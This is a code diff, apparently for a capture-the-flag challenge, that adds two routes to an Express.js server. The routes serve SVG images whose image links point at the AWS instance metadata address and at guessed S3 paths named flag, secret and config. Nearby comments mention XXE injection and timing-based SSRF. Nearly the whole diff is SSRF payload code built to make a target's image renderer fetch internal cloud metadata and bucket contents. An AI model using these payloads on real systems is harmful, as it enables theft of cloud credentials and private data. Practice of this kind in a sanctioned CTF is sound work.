@@ -19,6 +19,31 @@ app.get('/test', (req, res) => {
 // 1. XXE Injection in SVG
 // Internal endpoint discovery
 // Timing-based SSRF detection
+// AWS S3 internal endpoints
+app.get('/aws-internal', (req, res) => {
+  console.log('AWS internal endpoints requested');
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.send(`<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <image href="http://169.254.169.254/latest/meta-data/" width="100" height="100"/>
+  <image href="http://instance-data/latest/meta-data/" width="100" height="100"/>
+  <image href="http://cloudsek-ctf.s3.internal/flag" width="100" height="100"/>
+  <image href="http://s3.ap-south-1.amazonaws.com/cloudsek-ctf/flag" width="100" height="100"/>
+</svg>`);
+});
+
+// S3 bucket probing
+app.get('/s3-probe', (req, res) => {
+  console.log('S3 bucket probing');
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.send(`<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <image href="http://cloudsek-ctf.s3.ap-south-1.amazonaws.com/flag" width="100" height="100"/>
+  <image href="http://cloudsek-ctf.s3.amazonaws.com/flag.txt" width="100" height="100"/>
+  <image href="http://cloudsek-ctf.s3.ap-south-1.amazonaws.com/secret" width="100" height="100"/>
+  <image href="http://cloudsek-ctf.s3.ap-south-1.amazonaws.com/config" width="100" height="100"/>
+</svg>`);
+});
 app.get('/timing-attack', (req, res) => {
   console.log('Timing attack requested - checking for internal services');
   
